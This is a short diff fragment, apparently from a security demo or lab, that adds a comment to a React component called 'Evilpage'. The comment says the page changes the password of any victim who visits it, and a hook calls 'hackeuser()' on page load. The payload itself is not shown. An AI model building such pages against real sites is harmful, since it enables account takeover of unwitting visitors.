@@ -1,6 +1,8 @@
 "use client"
 import { useEffect } from "react";
 
+// Evil page that changes the password of the victim who visits this page
+
 export default function Evilpage() {
     useEffect(() => {
       hackeuser()
